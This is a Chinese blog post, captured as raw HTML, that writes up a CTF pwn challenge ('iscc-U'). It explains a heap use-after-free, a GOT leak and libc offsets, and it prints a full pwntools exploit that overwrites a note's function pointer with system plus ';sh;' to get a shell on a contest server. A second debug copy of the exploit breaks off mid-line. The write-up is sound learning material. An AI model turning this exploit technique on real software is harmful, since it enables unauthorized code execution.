@@ -1,0 +1,815 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xyyr.png">
+  <link rel="icon" href="/img/xyyr.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xyyr">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="iscc-U一道特殊的uaf，高版本，没开pie，特殊的打印机制。 警告：极其混乱，掺杂着无数次歪路  由于没有libc文件，不知道libc版本，没用unsotedbin泄露，不知道该减多少。  打印函数：  创建函数：  删除函数：   先创三个堆看看notelist的储存形式：    关于c语言：notelist本身指代的是这个空间指向的数据。例如int notelist &#x3D; aaa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyyr">
+<meta property="og:url" content="https://xyyr-c.github.io/2024/10/23/iscc-U/index.html">
+<meta property="og:site_name" content="xyyr">
+<meta property="og:description" content="iscc-U一道特殊的uaf，高版本，没开pie，特殊的打印机制。 警告：极其混乱，掺杂着无数次歪路  由于没有libc文件，不知道libc版本，没用unsotedbin泄露，不知道该减多少。  打印函数：  创建函数：  删除函数：   先创三个堆看看notelist的储存形式：    关于c语言：notelist本身指代的是这个空间指向的数据。例如int notelist &#x3D; aaa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/d9a9a109080c3f7c264ee.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/2d617a3a767bf7d4626ec.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/865d03c04189b910ba0a0.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/ea7da28bd690c413e4710.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/4dcfd085d4ca5d8f232e2.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/1939b68bbea3d9749b24a.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/be8a37e23d6cdc5a90f75.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/fdf567d47e1ff7d9867ec.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/d6ae5e03f17c3265ee8d5.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/419a22cf11018c519ddd2.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/0abbbe7cdbe5e9e67795b.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/c86745efd43105bb5cec6.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/de41b2b7fdfe38b55d23d.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/eec87cf72be4a62f13574.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/4f9f2ca7c9a26c8fcab41.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/6e906946ca44e62ef15a5.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/120cad2bfc1d70fc3c922.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/632a72593861a6d7e3147.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/bcf5f0a796b3500c77959.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/b0ac0b63513cb863c0f90.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/3587abe4474c54eb2187f.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/e6833a1aa4746a21e09a2.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/99f6d37291378e1380258.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/fdbd82f8ab3072278f3cc.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/7fdfe7464b5dc7711450d.png">
+<meta property="og:image" content="https://telegraph-image-5jy.pages.dev/file/2a6fa3461c47a2c340905.png">
+<meta property="article:published_time" content="2024-10-23T08:59:53.692Z">
+<meta property="article:modified_time" content="2024-05-17T15:14:07.828Z">
+<meta property="article:author" content="xyyr">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://telegraph-image-5jy.pages.dev/file/d9a9a109080c3f7c264ee.png">
+  
+  
+  
+  <title>xyyr</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/links.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyyr-c.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xyyr</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-23 16:59" pubdate>
+          2024年10月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年5月17日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="iscc-U"><a href="#iscc-U" class="headerlink" title="iscc-U"></a>iscc-U</h4><p>一道特殊的uaf，高版本，没开pie，特殊的打印机制。</p>
+<p>警告：极其混乱，掺杂着无数次歪路</p>
+<ul>
+<li>由于没有libc文件，不知道libc版本，没用unsotedbin泄露，不知道该减多少。</li>
+</ul>
+<p>打印函数：</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/d9a9a109080c3f7c264ee.png" srcset="/img/loading.gif" lazyload alt="image-20240512220930394"></p>
+<p>创建函数：</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/2d617a3a767bf7d4626ec.png" srcset="/img/loading.gif" lazyload alt="image-20240512221024284"></p>
+<p>删除函数：</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/865d03c04189b910ba0a0.png" srcset="/img/loading.gif" lazyload alt="image-20240512221102206"></p>
+<ol>
+<li>先创三个堆看看notelist的储存形式：</li>
+</ol>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/ea7da28bd690c413e4710.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>关于c语言：notelist本身指代的是这个空间指向的数据。例如int notelist &#x3D; aaaaaaaa,notelist就会指代这个aaaaaaa,&amp;notelist才会是指向的空间。这里也是这个道理，&amp;notelist 才是0x804c048。（但是gdb就是用notelist列来表示这个地址，只是C语言用&amp;来取）</li>
+<li>可以看到，这里存储的都是对应的printf_note（也是关键的利用点，相对不容易想到）开始想着是写死了，无法修改，其实释放掉两个块，然后创建一个8的块，就可以写入到先释放的8的块里。</li>
+</ul>
+<ol start="2">
+<li><p>按上述进行测试输入puts_plt</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/4dcfd085d4ca5d8f232e2.png" srcset="/img/loading.gif" lazyload alt="image-20240512221916405"></p>
+</li>
+<li><p>回忆忘记的点：</p>
+<p>malloc返回的地址都是指向数据域的。。。</p>
+</li>
+<li><p>注意看创建函数那里，数据域的堆的指针是放在了第一个小堆里的，然后输入数据的时候选了相同的地址把它覆盖掉了，但是输入数据的地址刚好会是第二个小堆的数据域！（纠错，没有覆盖，就是普通的+4,虽然c语言中指针p++是一下子加对应的字节数，但这里就是普通的加数值4）</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/1939b68bbea3d9749b24a.png" srcset="/img/loading.gif" lazyload alt="image-20240512225105450"></p>
+</li>
+</ol>
+<ul>
+<li><p>本来想着会不会直接引用到未分配的地址，但是细看，先创建了第二个数据堆，才将地址赋予的，妙蛙妙蛙</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/be8a37e23d6cdc5a90f75.png" srcset="/img/loading.gif" lazyload alt="image-20240512225358596"></p>
+</li>
+<li><p>纠错</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/fdf567d47e1ff7d9867ec.png" srcset="/img/loading.gif" lazyload alt="image-20240512233043692"></p>
+</li>
+</ul>
+<ol start="5">
+<li><p>注意这里是有参数的哦</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/d6ae5e03f17c3265ee8d5.png" srcset="/img/loading.gif" lazyload alt="image-20240512225434604"></p>
+</li>
+<li><p>为了利用到后续的数据，不能直接用puts_plt，而是题目中的print_note。另外，teache bin 后进先出。</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/419a22cf11018c519ddd2.png" srcset="/img/loading.gif" lazyload alt="image-20240512231944374"></p>
+</li>
+</ol>
+<p>1号堆的小堆1被当作新堆的print_note,0号堆的小堆1被当作新堆的数据域。但是它的数据还是在堆0的下方，把上面的巧合构成的无漏洞变成了漏洞。</p>
+<p>另外：不知道为啥puts_got输出不出来，换成read_got就没事了。</p>
+<ol start="7">
+<li>替换为system，实际执行为system(地址)，地址中存的是p32(system);$0;，第一个显然不是正常参数，所以会执行第二个。</li>
+<li>远程system需要+4来跳过这个函数</li>
+</ol>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/0abbbe7cdbe5e9e67795b.png" srcset="/img/loading.gif" lazyload alt="image-20240513002740004"></p>
+<p>如果不+4，报这个错误，但是程序不中断（只有+4和+1可以通过）</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/c86745efd43105bb5cec6.png" srcset="/img/loading.gif" lazyload alt="image-20240513102740263"></p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/de41b2b7fdfe38b55d23d.png" srcset="/img/loading.gif" lazyload alt="image-20240513102947864"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__x86<span class="hljs-selector-class">.get_pc_thunk</span><span class="hljs-selector-class">.dx</span> 是一个在某些编译器和操作系统下生成的特殊符号（symbol），通常在 x86 架构的程序中会看到这个符号出现。这个符号的作用是为了在程序中获取当前代码的位置计数器（Program Counter）的地址。<br><br>在 x86 架构中，程序执行时会使用一种相对寻址的方式来访问指令，这种方式会使用一个基地址加上相对地址的偏移量来确定指令的位置。__x86<span class="hljs-selector-class">.get_pc_thunk</span><span class="hljs-selector-class">.dx</span> 函数就是用来获取这个基地址，以便在程序中动态计算其他符号的地址。<br><br>通常情况下，程序员很少会直接调用或使用 __x86<span class="hljs-selector-class">.get_pc_thunk</span>.dx，因为这个函数主要被编译器和链接器内部使用。它在一些特定的链接策略中扮演着重要的角色，确保代码能够正确地执行并访问所需的数据和函数。<br></code></pre></td></tr></table></figure>
+
+<p>gpt这么解释的，怀疑会导致符号错误，明天有时间了换了libc文件试试。。</p>
+<blockquote>
+<p>踩坑日记：不要乱用别的libc，就用泄露的去下载，别偷懒！！！！</p>
+</blockquote>
+<p>调进去就是正常的system</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/eec87cf72be4a62f13574.png" srcset="/img/loading.gif" lazyload alt="image-20240513111542083"></p>
+<p>执行处</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/4f9f2ca7c9a26c8fcab41.png" srcset="/img/loading.gif" lazyload alt="image-20240513112111471"></p>
+<p>system+4的这里</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/6e906946ca44e62ef15a5.png" srcset="/img/loading.gif" lazyload alt="image-20240513112127085"></p>
+<p>啊！看着一模一样啊，而且各个参数的情况也一模一样，跳过一个endbr32按理说也没啥用啊。。。。</p>
+<p>system的本质是execve，那就下断点去看execve，+4的情况：</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/120cad2bfc1d70fc3c922.png" srcset="/img/loading.gif" lazyload alt="image-20240513112747384"></p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/632a72593861a6d7e3147.png" srcset="/img/loading.gif" lazyload alt="image-20240513112828074"></p>
+<p>突然发现变成64位了？？？？印象中有64、32的转换，搜了搜。（这篇看着不错，先保存，有时间再看）</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/countfatcode/p/11756258.html">Shellcode - countfatcode - 博客园 (cnblogs.com)</a></p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/bcf5f0a796b3500c77959.png" srcset="/img/loading.gif" lazyload alt="image-20240513113236988"></p>
+<p>不加4的话，在这个sysenter这里直接寄掉了</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/b0ac0b63513cb863c0f90.png" srcset="/img/loading.gif" lazyload alt="image-20240513113708057"></p>
+<p>怀疑是32位跳64位的时候被endbr32开启的cet检测给影响了，但是运行的程序没有被中断啊。。。</p>
+<p>又去查看跳转前的寄存器，二者也没啥区别。。。</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/3587abe4474c54eb2187f.png" srcset="/img/loading.gif" lazyload alt="image-20240513115110709"></p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/e6833a1aa4746a21e09a2.png" srcset="/img/loading.gif" lazyload alt="image-20240513115115155"></p>
+<p>查报错说可能是反引号的问题，打印一下看看</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/99f6d37291378e1380258.png" srcset="/img/loading.gif" lazyload alt="image-20240513115511388"></p>
+<p>成了！</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/fdbd82f8ab3072278f3cc.png" srcset="/img/loading.gif" lazyload alt="image-20240513115901212"></p>
+<p>（但是还是调试不进去）</p>
+<p>附加linux指令：</p>
+<blockquote>
+<p>用分号连接，表示执行多条指令</p>
+<p>system(“command1; command2; command3”);</p>
+<p>用&amp;&amp;连接，表示前一条成功才运行后一条</p>
+<p>system(“command1 &amp;&amp; command2 &amp;&amp; command3”);</p>
+<p>用||连接，前一条失败运行后一条</p>
+<p>system(“command1 || command2 || command3”);</p>
+</blockquote>
+<p>exp：</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./000&#x27;)<br>p=remote(&#x27;182.92.237.102&#x27;,10016)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def new(size,content):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;1&#x27;)<br>    ru(&#x27;size&#x27;)<br>    sd(size)<br>    <span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>    sd(content)<br><br>def show(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;3&#x27;)<br>    ru(&#x27;Index&#x27;)<br>    sd(index)<br><br>def dele(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;2&#x27;)<br>    rl()<br>    sd(index)<br>print_note = 0x80492b6 <br>read_got = 0x804C00C<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-string">&quot;AAAA&quot;</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">BBBB</span>&#x27;)</span><br><br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>dele(&#x27;0&#x27;)<br>dele(&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>new(&#x27;8&#x27;,p32(print_note)+p32(read_got))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>read_addr = u32(ru(&#x27;\xf7&#x27;)[-4:])<br>print(hex(read_addr))<br>pause()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>&#x27;&#x27;&#x27;<br>libc_base = read_addr - 0x0f0780<br>system_addr = libc_base + 0x041360 +1<br>&#x27;&#x27;&#x27;<br>libc = ELF(&#x27;/usr/lib/i386-linux-gnu/libc.so.6&#x27;)<br><br>libc_base = read_addr  - libc.sym[&#x27;read&#x27;]<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;] <br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>dele(&#x27;1&#x27;)<br>dele(&#x27;2&#x27;)<br><br>new(b&#x27;8&#x27;,p32(system_addr)+b&#x27;;sh;&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(b&#x27;1&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>调试exp：</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)<br>p=process(&#x27;./111&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=remote(&#x27;182.92.237.102&#x27;,10016)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def new(size,content):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;1&#x27;)<br>    ru(&#x27;size&#x27;)<br>    sd(size)<br>    <span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>    sd(content)<br><br>def show(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;3&#x27;)<br>    ru(&#x27;Index&#x27;)<br>    sd(index)<br><br>def dele(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;2&#x27;)<br>    rl()<br>    sd(index)<br>print_note = 0x80492b6 <br>read_got = 0x804C00C<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-string">&quot;AAAA&quot;</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">BBBB</span>&#x27;)</span><br><br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>dele(&#x27;0&#x27;)<br>dele(&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>new(&#x27;8&#x27;,p32(print_note)+p32(read_got))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>read_addr = u32(ru(&#x27;\xf7&#x27;)[-4:])<br>print(hex(read_addr))<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>&#x27;&#x27;&#x27;<br>libc_base = read_addr - 0x0f0780<br>system_addr = libc_base + 0x041360 +1<br>&#x27;&#x27;&#x27;<br>libc = ELF(&#x27;/home/kali/Desktop/libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;)<br><br>libc_base = read_addr  - libc.sym[&#x27;read&#x27;]<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;] <br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>dele(&#x27;1&#x27;)<br>dele(&#x27;2&#x27;)<br>payload = 